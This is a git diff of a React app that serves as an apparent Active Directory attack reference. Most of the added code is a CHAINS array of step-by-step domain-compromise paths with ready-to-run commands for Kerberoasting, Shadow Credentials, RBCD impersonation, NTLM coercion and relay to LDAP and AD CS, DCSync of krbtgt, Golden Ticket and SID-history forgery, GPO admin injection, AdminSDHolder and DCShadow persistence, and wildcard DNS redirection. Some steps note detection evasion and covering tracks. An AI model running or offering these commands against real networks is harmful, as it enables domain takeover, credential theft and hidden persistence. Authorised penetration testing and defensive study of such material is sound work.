@@ -1,5 +1,23 @@
 import React, { useState, useMemo, useEffect } from "react";
-import { Search, Copy, Check, Terminal, ChevronRight, Pencil, FolderTree, Sun, Moon } from "lucide-react";
+import {
+  Search,
+  Copy,
+  Check,
+  Terminal,
+  ChevronRight,
+  Pencil,
+  FolderTree,
+  Sun,
+  Moon,
+  Menu,
+  X,
+  Github,
+  ExternalLink,
+  GitBranch,
+  BookOpen,
+  ShieldAlert,
+  Workflow,
+} from "lucide-react";
 
 // ============================================================
 // DESIGN TOKENS
@@ -74,8 +92,11 @@ function GlobalStyle() {
         to { opacity: 1; transform: translateX(0); }
       }
       .dit-line { animation: dit-line-in 0.35s ease-out both; }
+      .menu-drawer-backdrop { transition: opacity 200ms ease; }
+      .menu-drawer-panel { transition: transform 220ms cubic-bezier(0.22, 1, 0.36, 1); }
       @media (prefers-reduced-motion: reduce) {
         .dit-line { animation: none; }
+        .menu-drawer-backdrop, .menu-drawer-panel { transition: none; }
       }
     `}</style>
   );
@@ -3772,6 +3793,726 @@ const EDGES = [
 ];
 
 // ============================================================
+// ATTACK CHAINS — the individual EDGES above are single-hop
+// primitives; a real BloodHound path is usually 3-6 of them linked
+// together. Each chain is a tree of nodes (root = starting position,
+// leaves = end state), rendered with real tree connectors. `edgeId`
+// cross-links a node back to its full command writeup in EDGES.
+// ============================================================
+const CHAINS = [
+  {
+    id: "writespn-kerberoast",
+    title: "WriteSPN → Kerberoast → Local Admin",
+    category: "acl",
+    summary:
+      "Plant a Service Principal Name on an account you control write access to, then Kerberoast it like any other service account — turns a write primitive into an offline-crackable credential.",
+    root: {
+      label: "Low-priv domain user",
+      children: [
+        {
+          label: "WriteSPN",
+          edgeId: "WriteSPN",
+          note: "right held over $TARGETOBJECT",
+          children: [
+            {
+              label: "Plant an SPN",
+              command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add spn --spn HTTP/fake $TARGETOBJECT",
+              children: [
+                {
+                  label: "Kerberoast it",
+                  command: "GetUserSPNs.py $DOMAIN/$USER:$PASS -request",
+                  children: [
+                    {
+                      label: "Crack offline",
+                      command: "hashcat -m 13100 hashes.txt rockyou.txt",
+                      children: [{ label: "Target account's plaintext password" }],
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "genericwrite-shadow-pkinit",
+    title: "GenericWrite → Shadow Credentials → PKINIT → Takeover",
+    category: "acl",
+    summary:
+      "GenericWrite (or the narrower AddKeyCredentialLink) lets you attach a certificate the account never asked for — PKINIT then treats that certificate as sufficient proof of identity.",
+    root: {
+      label: "GenericWrite / AddKeyCredentialLink",
+      edgeId: "GenericWrite-User",
+      note: "held over $TARGETOBJECT",
+      children: [
+        {
+          label: "Shadow Credentials",
+          command: "certipy shadow auto -u $USER@$DOMAIN -p $PASS -account $TARGETOBJECT -dc-ip $DC",
+          children: [
+            {
+              label: "PKINIT authentication",
+              note: "authenticate using the planted certificate — no password needed",
+              children: [{ label: "NT hash + TGT for the target account", note: "full takeover" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "computer-acl-rbcd-s4u",
+    title: "GenericAll on Computer → RBCD → S4U2Proxy → SYSTEM",
+    category: "acl",
+    summary:
+      "Control over a computer object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute lets you configure Resource-Based Constrained Delegation to yourself, then impersonate anyone through it.",
+    root: {
+      label: "GenericAll / GenericWrite on Computer",
+      edgeId: "GenericAll-Computer",
+      children: [
+        {
+          label: "Configure RBCD",
+          command: "rbcd.py -delegate-to '$TARGETOBJECT$' -delegate-from 'ATTACKER$' -action write $DOMAIN/$USER:$PASS",
+          children: [
+            {
+              label: "S4U2Self + S4U2Proxy",
+              command: "getST.py -spn cifs/$TARGET $DOMAIN/'ATTACKER$':'Passw0rd!' -impersonate administrator",
+              children: [{ label: "SYSTEM on the target computer", note: "pass the ticket, psexec.py" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "writedacl-addmember-da",
+    title: "WriteDACL → AddMember → Domain Admins",
+    category: "acl",
+    summary:
+      "WriteDACL doesn't grant membership by itself — it grants the right to grant yourself membership rights, which is the extra hop this chain makes explicit.",
+    root: {
+      label: "WriteDACL on Domain Admins",
+      edgeId: "WriteDacl",
+      note: "or an OU/container it inherits from",
+      children: [
+        {
+          label: "Grant self WriteMembers",
+          command: "dacledit.py -action write -rights WriteMembers -principal $USER $TARGETOBJECT",
+          children: [
+            {
+              label: "AddMember",
+              edgeId: "AddMember",
+              command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember $TARGETOBJECT $USER",
+              children: [{ label: "Domain Admin" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "writeowner-takeover",
+    title: "WriteOwner → WriteDACL → (pick your primitive)",
+    category: "acl",
+    summary:
+      "WriteOwner is a meta-primitive: it doesn't touch the object directly, it lets you become the owner — and an owner can always grant themselves WriteDACL, which unlocks every other ACL primitive on this list.",
+    root: {
+      label: "WriteOwner on target object",
+      edgeId: "WriteOwner",
+      children: [
+        {
+          label: "Take ownership",
+          command: "owneredit.py -action write -owner $USER $TARGETOBJECT",
+          children: [
+            {
+              label: "Grant self full control",
+              command: "dacledit.py -action write -rights FullControl -principal $USER $TARGETOBJECT",
+              children: [
+                { label: "ForceChangePassword", note: "→ account takeover", edgeId: "ForceChangePassword" },
+                { label: "AddMember", note: "→ privileged group, if target is a group", edgeId: "AddMember" },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "forcechangepassword-lateral",
+    title: "ForceChangePassword → Takeover → Lateral Movement",
+    category: "acl",
+    summary:
+      "Resetting a password doesn't need the old one — this is the fastest ACL primitive to weaponize, and it inherits whatever access the target account already had.",
+    root: {
+      label: "ForceChangePassword",
+      edgeId: "ForceChangePassword",
+      note: "held over $TARGETOBJECT — no existing password needed",
+      children: [
+        {
+          label: "Reset the password",
+          command: "net rpc password $TARGETOBJECT 'NewPassw0rd!' -U $DOMAIN/$USER%$PASS -S $DC",
+          children: [
+            {
+              label: "Authenticate as the target",
+              children: [
+                { label: "CanRDP / AdminTo", note: "→ interactive access on whatever it admins" },
+                { label: "Kerberoastable / DCSync rights", note: "→ inherited from the target, further escalation" },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "unconstrained-delegation",
+    title: "Unconstrained Delegation Abuse",
+    category: "deleg",
+    summary:
+      "A host trusted for unconstrained delegation caches a full TGT for anyone who authenticates to it — coerce a privileged account to connect, then just take its ticket.",
+    root: {
+      label: "Compromise a host with Unconstrained Delegation",
+      note: "TRUSTED_FOR_DELEGATION on the computer's UAC flags",
+      children: [
+        {
+          label: "Coerce authentication",
+          note: "forces DC$ to connect back",
+          command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
+          children: [
+            {
+              label: "TGT captured in LSASS",
+              command: "Rubeus.exe monitor /interval:5 /filteruser:administrator",
+              children: [
+                {
+                  label: "Pass-the-ticket as DC$",
+                  children: [{ label: "DCSync using DC$'s TGT", note: "→ full domain compromise" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "constrained-delegation-s4u",
+    title: "Constrained Delegation → S4U2Self / S4U2Proxy",
+    category: "deleg",
+    summary:
+      "msDS-AllowedToDelegateTo lets an account impersonate any user toward a specific service — S4U2Self manufactures the impersonation ticket, S4U2Proxy exchanges it for the real thing.",
+    root: {
+      label: "Compromise account with constrained delegation",
+      edgeId: "AllowedToDelegate",
+      note: "msDS-AllowedToDelegateTo set on the account",
+      children: [
+        {
+          label: "S4U2Self",
+          note: "impersonate any user to yourself — no interaction with that user needed",
+          children: [
+            {
+              label: "S4U2Proxy",
+              command: "getST.py $DOMAIN/$USER:$PASS -spn cifs/$TARGET -impersonate administrator",
+              children: [{ label: "Access the allowed service as the impersonated user" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "gpo-abuse",
+    title: "GPO Abuse → SYSTEM on Linked Computers",
+    category: "gpo",
+    summary:
+      "Write access to a GPO is write access to every computer it's linked to — the policy just needs to apply once at the next gpupdate.",
+    root: {
+      label: "GenericWrite / WriteDACL on a GPO",
+      edgeId: "GPLink",
+      children: [
+        {
+          label: "Edit the GPO",
+          command:
+            "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author $DOMAIN\\$USER --Command cmd.exe --Arguments '/c net localgroup administrators $USER /add' --GPOName 'VulnGPO'",
+          children: [
+            {
+              label: "Policy applies at next gpupdate",
+              command: "gpupdate /force",
+              note: "or wait for the refresh interval",
+              children: [{ label: "SYSTEM / local admin on every linked computer" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "maq-rbcd",
+    title: "MachineAccountQuota → New Computer → RBCD → SYSTEM",
+    category: "deleg",
+    summary:
+      "The default MachineAccountQuota of 10 means any domain user can create a computer object outright — and an object you create, you control, which is enough to configure RBCD against a target.",
+    root: {
+      label: "Default MachineAccountQuota (10)",
+      children: [
+        {
+          label: "Create a computer object",
+          command: "addcomputer.py $DOMAIN/$USER:$PASS -computer-name 'ATTACKER$' -computer-pass 'Passw0rd!'",
+          children: [
+            {
+              label: "Configure RBCD on a target",
+              command: "rbcd.py -delegate-to '$TARGETOBJECT$' -delegate-from 'ATTACKER$' -action write $DOMAIN/$USER:$PASS",
+              children: [
+                {
+                  label: "S4U2Proxy impersonating Administrator",
+                  command: "getST.py -spn cifs/$TARGET $DOMAIN/'ATTACKER$':'Passw0rd!' -impersonate administrator",
+                  children: [{ label: "SYSTEM on the target computer" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "dcsync-golden-ticket",
+    title: "DCSync → krbtgt → Golden Ticket → Domain Admin",
+    category: "credread",
+    summary:
+      "DCSync rights read krbtgt's hash without ever touching a DC's disk; from there a Golden Ticket is forged entirely offline and lets you mint valid TGTs for any user, in any group, indefinitely.",
+    root: {
+      label: "GetChanges + GetChangesAll",
+      edgeId: "DCSync",
+      note: "held on the domain object",
+      children: [
+        {
+          label: "DCSync",
+          command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt",
+          children: [
+            {
+              label: "krbtgt NT hash",
+              children: [
+                {
+                  label: "Forge a Golden Ticket",
+                  command: "ticketer.py -nthash $HASH -domain-sid $SID -domain $DOMAIN Administrator",
+                  children: [{ label: "Domain Admin, offline, until krbtgt is rotated twice" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+
+  // ---------------- Batch 2: coercion, ADCS, credential-dump, and Tier-0 chains ----------------
+  {
+    id: "coercion-relay-shadow-creds",
+    title: "Coercion → NTLM Relay → LDAP → Shadow Credentials",
+    category: "acl",
+    summary:
+      "Coerced authentication doesn't have to land in your listener as-is — relayed straight to LDAP, it can plant Shadow Credentials on the coerced computer instead of just passing the hash.",
+    root: {
+      label: "Coerce a machine account",
+      note: "PrinterBug / PetitPotam / DFSCoerce",
+      command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
+      children: [
+        {
+          label: "Relay to LDAP, add Shadow Credentials",
+          command: "ntlmrelayx.py -t ldap://$DC --shadow-credentials --shadow-target '$TARGETOBJECT$'",
+          children: [
+            {
+              label: "Certificate added to msDS-KeyCredentialLink",
+              children: [
+                {
+                  label: "PKINIT as the coerced computer",
+                  command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
+                  children: [{ label: "Full control of the coerced machine account" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "coercion-relay-rbcd",
+    title: "Coercion → NTLM Relay → LDAP → RBCD",
+    category: "acl",
+    summary:
+      "The RBCD variant of the same relay: instead of planting a certificate, the relayed LDAP write configures delegation, then S4U2Proxy does the impersonation.",
+    root: {
+      label: "Coerce a machine account",
+      note: "PrinterBug / PetitPotam / DFSCoerce",
+      command: "python3 dfscoerce.py -u $USER -p $PASS -d $DOMAIN $ATTACKER $DC",
+      children: [
+        {
+          label: "Relay to LDAP, write RBCD",
+          command: "ntlmrelayx.py -t ldap://$DC --delegate-access",
+          children: [
+            {
+              label: "msDS-AllowedToActOnBehalfOfOtherIdentity set to an attacker-controlled computer",
+              children: [
+                {
+                  label: "S4U2Proxy impersonating Administrator",
+                  command: "getST.py -spn cifs/$TARGET $DOMAIN/'ATTACKER$':'Passw0rd!' -impersonate administrator",
+                  children: [{ label: "SYSTEM on the coerced computer" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "coercion-relay-esc8",
+    title: "Coercion → NTLM Relay → ADCS ESC8 → Domain Compromise",
+    category: "adcs",
+    summary:
+      "Relayed straight to AD CS's HTTP enrollment endpoint instead of LDAP, coerced DC authentication becomes a certificate that authenticates as the DC itself.",
+    root: {
+      label: "Coerce the DC to authenticate",
+      command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
+      children: [
+        {
+          label: "Relay to AD CS web enrollment (ESC8)",
+          command: "ntlmrelayx.py --adcs --template DomainController -t http://$DC/certsrv/certfnsh.asp -smb2support",
+          children: [
+            {
+              label: "Certificate issued for the DC's own machine identity",
+              children: [
+                {
+                  label: "PKINIT as the DC",
+                  command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
+                  children: [{ label: "DCSync using the DC's own identity", note: "→ full domain compromise" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "esc4-esc1-pkinit",
+    title: "ADCS ESC4 → ESC1 → PKINIT → Domain Admin",
+    category: "adcs",
+    summary:
+      "ESC4 (write access to a template) isn't exploitable by itself — it's exploitable because it lets you reconfigure the template into an ESC1-vulnerable one, then run the ESC1 chain against your own edit.",
+    root: {
+      label: "WriteOwner / WriteDacl / GenericWrite on a certificate template",
+      edgeId: "ADCSESC4",
+      children: [
+        {
+          label: "Reconfigure the template (ESC4)",
+          command: "certipy template -u $USER@$DOMAIN -p $PASS -template 'VulnTemplate' -save-old",
+          children: [
+            {
+              label: "Template is now ESC1-exploitable",
+              children: [
+                {
+                  label: "Request a cert as any user (ESC1)",
+                  command: "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'VulnTemplate' -upn administrator@$DOMAIN",
+                  children: [
+                    {
+                      label: "PKINIT as Administrator",
+                      command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
+                      children: [{ label: "Domain Admin" }],
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "gpp-sysvol-lateral",
+    title: "SYSVOL/NETLOGON → GPP cpassword → Lateral Movement",
+    category: "credread",
+    summary:
+      "SYSVOL is readable by every authenticated domain user by default — a Group Policy Preferences item left over from before MS14-025 hands out an AES-decryptable local admin password.",
+    root: {
+      label: "Read access to SYSVOL",
+      note: "default for every domain user",
+      children: [
+        {
+          label: "Find a leftover Groups.xml with a cpassword",
+          note: "search \\\\$DC\\SYSVOL\\...\\Policies\\...\\Groups\\Groups.xml",
+          children: [
+            {
+              label: "Decrypt the cpassword",
+              note: "Microsoft's AES key for GPP is public",
+              command: "gpp-decrypt $HASH",
+              children: [
+                {
+                  label: "Local admin password, deployed via GPP",
+                  children: [{ label: "Lateral movement to every host that GPP pushed it to" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "laps-lateral",
+    title: "LAPS Read → Local Admin → Lateral Movement",
+    category: "credread",
+    summary:
+      "LAPS rotates local admin passwords per-computer specifically to stop this kind of chain from going anywhere — but read rights on the password attribute still hand you that one computer.",
+    root: {
+      label: "ReadLAPSPassword / All Extended Rights",
+      edgeId: "ReadLAPSPassword",
+      note: "held on a LAPS-managed computer",
+      children: [
+        {
+          label: "Read the LAPS password",
+          command: "Get-LapsADPassword $TARGETOBJECT -AsPlainText",
+          children: [
+            {
+              label: "Local admin credential for that specific computer",
+              children: [
+                {
+                  label: "CanRDP / AdminTo / PSRemote on that host",
+                  note: "LAPS passwords are unique per computer — this doesn't chain further without another primitive",
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "ntds-reuse-lateral",
+    title: "NTDS.dit → Password Reuse → Lateral Movement",
+    category: "credread",
+    summary:
+      "A full NTDS dump gives every account hash in the domain at once — cracking the weak ones and checking for reuse turns one DCSync into admin on hosts that have nothing to do with the original target.",
+    root: {
+      label: "DCSync rights, or offline NTDS.dit + SYSTEM hive access",
+      children: [
+        {
+          label: "Full NTDS dump",
+          command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc",
+          children: [
+            {
+              label: "Crack weak/reused hashes offline",
+              command: "hashcat -m 1000 ntds.txt rockyou.txt",
+              children: [
+                {
+                  label: "Password reused as local admin elsewhere",
+                  note: "shared local admin, forgotten service accounts",
+                  children: [{ label: "Lateral movement across every host sharing that password" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "trust-abuse",
+    title: "Trust Abuse — Cross-Domain / Cross-Forest Escalation",
+    category: "gpo",
+    summary:
+      "A trust relationship is itself an edge — with SID filtering disabled (routine on parent/child, rare but real cross-forest), a ticket forged in the trusted domain carries privilege into the trusting one.",
+    root: {
+      label: "TrustedBy",
+      edgeId: "TrustedBy",
+      note: "another domain/forest trusts this one",
+      children: [
+        {
+          label: "Check SID filtering status",
+          note: "this chain requires SID filtering disabled to cross the trust boundary",
+          children: [
+            {
+              label: "Forge an inter-realm TGT carrying a privileged SID",
+              command: "ticketer.py -nthash $HASH -domain-sid $SID -domain $DOMAIN -extra-sid $SID-519 -sid $SID administrator",
+              children: [{ label: "Domain Admin in the trusting domain/forest" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "sidhistory-abuse",
+    title: "SIDHistory Abuse",
+    category: "deleg",
+    summary:
+      "sIDHistory exists for legitimate account migration — a forged ticket carrying a privileged historical SID inherits that SID's rights the instant it's presented, no membership check involved.",
+    root: {
+      label: "Write access to sIDHistory, or a domain with SID filtering disabled",
+      edgeId: "HasSIDHistory",
+      children: [
+        {
+          label: "Forge a ticket carrying a privileged historical SID",
+          command: "ticketer.py -nthash $HASH -domain-sid $SID -domain $DOMAIN -extra-sid $SID-519 administrator",
+          children: [
+            {
+              label: "Rights of the historical SID apply on presentation",
+              children: [{ label: "Domain Admin, if the forged SID belonged to that group" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "adminsdholder-persistence",
+    title: "AdminSDHolder Abuse (Persistence)",
+    category: "acl",
+    summary:
+      "SDProp copies AdminSDHolder's ACL onto every protected group member on a recurring cycle — plant an ACE there once and it keeps re-applying itself, surviving individual password resets.",
+    root: {
+      label: "Temporary WriteDACL on AdminSDHolder",
+      note: "e.g. from the WriteOwner chain above, used once",
+      children: [
+        {
+          label: "Grant a controlled principal full rights",
+          command: "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity $USER -Rights All",
+          children: [
+            {
+              label: "SDProp propagates the ACE to every protected group member",
+              note: "runs on a roughly 60-minute cycle from the PDC emulator",
+              children: [{ label: "Persistent control over Domain Admins and every other Tier-0 group" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "dcshadow-persistence",
+    title: "DCShadow — Rogue Replication Partner",
+    category: "acl",
+    summary:
+      "Registering as a fake domain controller lets you push an attribute change directly into AD's replication stream — it lands on every real DC without ever generating the object-modification events they'd normally log.",
+    root: {
+      label: "DA-equivalent rights, at least once",
+      children: [
+        {
+          label: "Register as a rogue replication partner and push a change",
+          command: "lsadump::dcshadow /object:$TARGETOBJECT /attribute:primaryGroupID /value:512",
+          children: [
+            {
+              label: "Change replicates to every real DC",
+              note: "bypasses 4662/5136 — no object-modification event on the real DCs",
+              children: [{ label: "Persists across krbtgt rotation and DA password resets" }],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "dns-abuse",
+    title: "AD-Integrated DNS Abuse",
+    category: "acl",
+    summary:
+      "Every authenticated user can create DNS records in an AD-integrated zone by default — a wildcard record turns every unresolved lookup on the network into a rendezvous with attacker infrastructure.",
+    root: {
+      label: "WriteDacl / DnsAdmins membership on the zone",
+      note: "or the default authenticated-user record-creation right",
+      children: [
+        {
+          label: "Plant a wildcard record",
+          command: "dnstool.py -u $DOMAIN\\$USER -p $PASS --action add --record '*' --data $ATTACKER --type A $DC",
+          children: [
+            {
+              label: "Unresolved lookups redirect to attacker infrastructure",
+              note: "useful rendezvous point for coercion/relay setups",
+              children: [
+                {
+                  label: "Clean up before it's noticed",
+                  command: "dnstool.py -u $DOMAIN\\$USER -p $PASS --action remove --record '*' --type A $DC",
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+
+  // ---------------- CVE chains — the same CVEs tracked in the CVEs tab, graphed end to end ----------------
+  {
+    id: "cve-certifried-chain",
+    title: "CVE-2022-26923 (Certifried) — Full Chain",
+    category: "adcs",
+    summary:
+      "The historically real version of the ESC8-style DC-impersonation chain: a standard domain user, no coercion or relay needed, just an unvalidated attribute write plus AD CS's default trust in machine identity.",
+    root: {
+      label: "Domain user",
+      note: "default MachineAccountQuota",
+      children: [
+        {
+          label: "Create a computer account",
+          command: "addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Passw0rd!' $DOMAIN/$USER:$PASS",
+          children: [
+            {
+              label: "Rewrite dNSHostName to match a real DC",
+              command: "certipy account update -u $USER@$DOMAIN -p $PASS -user 'FAKE01$' -dns $DC",
+              children: [
+                {
+                  label: "Request a Machine-template cert as the spoofed identity",
+                  command: "certipy req -u 'FAKE01$'@$DOMAIN -p 'Passw0rd!' -ca 'CA-NAME' -template Machine -dns $DC",
+                  children: [
+                    {
+                      label: "Certificate authenticates as the real DC",
+                      children: [{ label: "DCSync using the DC's own identity", note: "→ full domain compromise" }],
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "cve-25177-chain",
+    title: "CVE-2026-25177 (SPN/UPN Collision) — Full Chain",
+    category: "deleg",
+    summary:
+      "Connects directly to WriteSPN: the same write access that enables Kerberoasting can, per independent research, also plant Unicode confusables that survive AD's forest-wide uniqueness check.",
+    root: {
+      label: "WriteSPN / self-service SPN or UPN write",
+      edgeId: "WriteSPN",
+      note: "held on a low-priv account",
+      children: [
+        {
+          label: "Inject Unicode confusables into the SPN/UPN value",
+          note: "zero-width spaces, homoglyphs, BOM markers",
+          children: [
+            {
+              label: "Forest-wide SPN/UPN uniqueness check bypassed",
+              children: [
+                {
+                  label: "Kerberos ticket mis-issuance / identity confusion with the collided principal",
+                  note: "root cause per independent research, not vendor-confirmed — treat as high-severity pending Microsoft's own writeup",
+                  children: [{ label: "Privileged identity confusion", note: "→ privilege escalation" }],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+];
+
+// ============================================================
 // LEARNBOOK — why/how/effect explanations, separate from the
 // command reference and the edge-abuse playbooks above.
 // ============================================================
@@ -4459,6 +5200,242 @@ function EntryCard({ entry, values }) {
   );
 }
 
+// Inline brand mark — lucide-react ships generic outline icons only, no
+// Discord glyph, so this is the Simple Icons Discord path (CC0) drawn as a
+// plain currentColor SVG so it inherits color/hover like every lucide icon
+// used alongside it.
+function DiscordIcon({ size = 13, style }) {
+  return (
+    <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor" style={style} aria-hidden="true">
+      <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.522 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z" />
+    </svg>
+  );
+}
+
+// One nav row — owns its own hover state (same pattern EdgeCard/EntryCard use
+// elsewhere) rather than lifting a "hoveredKey" into the parent.
+function MenuNavItem({ item, active, onClick }) {
+  const [hover, setHover] = useState(false);
+  const color = item.color || SIGNATURE;
+  return (
+    <button
+      onMouseEnter={() => setHover(true)}
+      onMouseLeave={() => setHover(false)}
+      onClick={onClick}
+      className="w-full flex items-center gap-2.5 text-left px-4 py-2.5 text-[13px] transition-colors"
+      style={{
+        fontFamily: FONT_MONO,
+        color: active ? color : hover ? TEXT_PRIMARY : TEXT_BODY,
+        background: active ? color + "14" : hover ? BORDER_1 : "transparent",
+        borderLeft: `2px solid ${active ? color : "transparent"}`,
+      }}
+    >
+      {item.Icon ? (
+        <item.Icon size={14} style={{ color: active ? color : STRUCTURAL, flexShrink: 0 }} />
+      ) : (
+        <span className="shrink-0 rounded-full" style={{ width: 6, height: 6, background: color }} />
+      )}
+      <span className="truncate">{item.label}</span>
+    </button>
+  );
+}
+
+function MenuLink({ label, url, Icon }) {
+  const [hover, setHover] = useState(false);
+  return (
+    <a
+      href={url}
+      target="_blank"
+      rel="noopener noreferrer"
+      onMouseEnter={() => setHover(true)}
+      onMouseLeave={() => setHover(false)}
+      className="flex items-center gap-2.5 px-4 py-2 text-[12px] transition-colors"
+      style={{ fontFamily: FONT_MONO, color: hover ? SIGNATURE : STRUCTURAL, background: hover ? BORDER_1 : "transparent" }}
+    >
+      <Icon size={13} style={{ flexShrink: 0 }} />
+      {label}
+    </a>
+  );
+}
+
+// ============================================================
+// MENU DRAWER — collapsed icon in the header; clicking it pops a
+// left-side drawer combining top-level views (Commands/AttackPaths/
+// Learnbook/CVEs) and Commands' phase filters into one flat sitemap,
+// since the list is short enough that splitting them into separate
+// menus just adds a click for no benefit. Stays mounted (rather than
+// unmounting on close) so both the backdrop fade and the panel slide
+// animate in both directions.
+// ============================================================
+function MenuDrawer({ open, onClose, view, setView, activePhase, setActivePhase, edgeMode, setEdgeMode }) {
+  const navItems = [
+    { kind: "view", id: "commands", label: "CN=Commands", Icon: Terminal },
+    ...PHASES.map((p) => ({ kind: "phase", id: p.id, label: p.label, color: p.color })),
+    { kind: "edgeMode", id: "edge-lookup", edgeMode: "edges", label: "CN=EdgeLookup", Icon: GitBranch },
+    { kind: "edgeMode", id: "attack-chains", edgeMode: "chains", label: "CN=AttackChains", Icon: Workflow },
+    { kind: "view", id: "learnbook", label: "CN=Learnbook", Icon: BookOpen },
+    { kind: "view", id: "cves", label: "CN=CVEs", Icon: ShieldAlert },
+  ];
+
+  const links = [
+    { label: "GitHub", url: "https://github.com/Gh0ulH4x/AD-arsenal", Icon: Github },
+    { label: "GTFOBins", url: "https://gtfobins.github.io/", Icon: ExternalLink },
+    { label: "revshells.com", url: "https://revshells.com/", Icon: ExternalLink },
+    // Placeholder — swap url with the real invite link when ready.
+    { label: "Discord Community", url: "#", Icon: DiscordIcon },
+  ];
+
+  const isActive = (item) => {
+    if (item.kind === "view") return view === item.id && (item.id !== "commands" || activePhase === "all");
+    if (item.kind === "edgeMode") return view === "edges" && edgeMode === item.edgeMode;
+    return view === "commands" && activePhase === item.id;
+  };
+
+  const select = (item) => {
+    if (item.kind === "view") {
+      setView(item.id);
+      if (item.id === "commands") setActivePhase("all");
+    } else if (item.kind === "edgeMode") {
+      setView("edges");
+      setEdgeMode(item.edgeMode);
+    } else {
+      setView("commands");
+      setActivePhase(item.id);
+    }
+    onClose();
+  };
+
+  return (
+    <>
+      <div
+        onClick={onClose}
+        aria-hidden={!open}
+        className="menu-drawer-backdrop fixed inset-0 z-40"
+        style={{
+          background: "rgba(0,0,0,0.55)",
+          backdropFilter: "blur(1px)",
+          opacity: open ? 1 : 0,
+          pointerEvents: open ? "auto" : "none",
+        }}
+      />
+      <div
+        className="menu-drawer-panel fixed left-0 top-0 h-full z-50 flex flex-col"
+        style={{
+          width: 264,
+          background: SURFACE,
+          borderRight: `1px solid ${BORDER_2}`,
+          boxShadow: open ? "4px 0 24px rgba(0,0,0,0.25)" : "none",
+          transform: `translateX(${open ? "0" : "-100%"})`,
+          pointerEvents: open ? "auto" : "none",
+        }}
+      >
+        <div className="flex items-center justify-between px-4 py-4" style={{ borderBottom: `1px solid ${BORDER_1}` }}>
+          <div className="flex items-center gap-2">
+            <FolderTree size={14} style={{ color: SIGNATURE }} />
